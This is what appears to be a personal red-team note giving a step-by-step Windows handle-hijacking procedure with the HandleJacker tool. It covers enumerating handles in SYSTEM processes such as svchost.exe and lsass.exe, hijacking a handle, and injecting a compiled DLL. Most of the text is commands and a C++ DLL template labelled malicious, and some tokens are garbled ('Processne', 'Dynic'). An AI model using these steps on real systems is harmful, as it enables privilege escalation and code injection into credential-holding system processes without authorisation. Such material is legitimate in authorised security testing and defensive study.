use handle jacker for speed and ease
https://github.com/a7t0fwa7/HandleJacker.git

use handle-ripper for more complex and depth

https://github.com/ZeroMemoryEx/Handle-Ripper.git


### **Steps to Exploit Handle Hijacking**

1. **Identify Target Handles:**
    
    - Use tools like Process Explorer or Procmon to identify handles in high-privilege processes that can be targeted. Look for processes running as SYSTEM or Administrator.

- **Process Explorer (Sysinternals):**
    
    - View the handles opened by a process and identify potential targets for hijacking.
    - **Command:** Launch Process Explorer and use the **Handle or DLL view** to see the handles.
- **Procmon (Process Monitor):**
    
    - Monitor handle operations such as `OpenProcess`, `DuplicateHandle`, `CreateFile`, and `RegOpenKey` to identify potential hijacking attempts.
    - **Command:** Start Procmon and apply filters to capture handle-related operations.
    - 
- **Handle (Sysinternals):**
    
    - List or close open handles in a process.
    - **Command:**
```
`handle.exe -a -p <Processne>`
```
        


### **Step 1: Setup HandleJacker**

1. **Download and Compile:**
   - Clone the HandleJacker repository:
     ```bash
     git clone https://github.com/a7t0fwa7/HandleJacker.git
     cd HandleJacker
     ```
   - Open the project in Visual Studio and compile it to generate the executable.

2. **Run HandleJacker:**
   - Launch HandleJacker with administrative privileges to enumerate and manipulate handles in high-privilege processes.

### **Step 2: Enumerate Handles**

1. **List Handles for a Target Process:**
   - Identify high-privilege processes (e.g., `svchost.exe`, `lsass.exe`, `winlogon.exe`, `explorer.exe`) running with elevated privileges.
   - Use HandleJacker to list handles:
     ```bash
     HandleJacker.exe -p <Processne>
     ```
   - Example:
     ```bash
     HandleJacker.exe -p svchost.exe
     ```
   - Look for handles associated with critical system resources that have `WRITE`, `MODIFY`, or `ALL ACCESS` permissions.

### **Step 3: Perform Privilege Escalation and Inject Code**

1. **Obtain and Hijack a Handle:**
   - After identifying a vulnerable handle, hijack it:
     ```bash
     HandleJacker.exe -p <Processne> -h <HandleValue>
     ```
   - Example:
     ```bash
     HandleJacker.exe -p svchost.exe -h 0x00000CFC
     ```

2. **Prepare the Malicious DLL:**
   - Write and compile a DLL with the code you want to execute. Example code in C++:
     ```cpp
     #include <windows.h>

     BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
         if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
             MessageBox(NULL, "Injected!", "DLL Injection", MB_OK);
         }
         return TRUE;
     }
     ```

- **Configure the Project:**
    
    - Right-click on the project in the `Solution Explorer` and select `Properties`.
    - In the `Configuration Properties`, make sure the project type is set to `Dynic Library (.dll)`.
- **Build the DLL:**
    
    - Click `Build` > `Build Solution` (or press `Ctrl+Shift+B`).
    - If everything is set up correctly, Visual Studio will compile the DLL, and you will find the output in the `Debug` or `Release` folder within your project directory (e.g., `\MessageBoxDLL\Debug\MessageBoxDLL.dll`).
    
1. **Inject the DLL:**
   - Use HandleJacker to inject the DLL into the hijacked process:
     ```bash
     HandleJacker.exe -p <Processne> -h <HandleValue> -i <PathToDLL>
     ```
   - Example:
     ```bash
     HandleJacker.exe -p svchost.exe -h 0x00000CFC -i C:\path\to\malicious.dll
     ```

### **Common Privileged Processes for Handle Hijacking**

- **`svchost.exe`**: Hosts Windows services, often runs with SYSTEM privileges.
- **`lsass.exe`**: Manages security policies and user authentication, runs with SYSTEM privileges.
- **`winlogon.exe`**: Manages the Windows logon process, runs with SYSTEM privileges.
- **`explorer.exe`**: The Windows GUI shell, runs with user privileges but is a common target for lateral movement.
- **`services.exe`**: Manages system services, runs with SYSTEM privileges.
- **`smss.exe`**: Session Manager Subsystem, responsible for handling sessions and starting processes, runs with SYSTEM privileges.
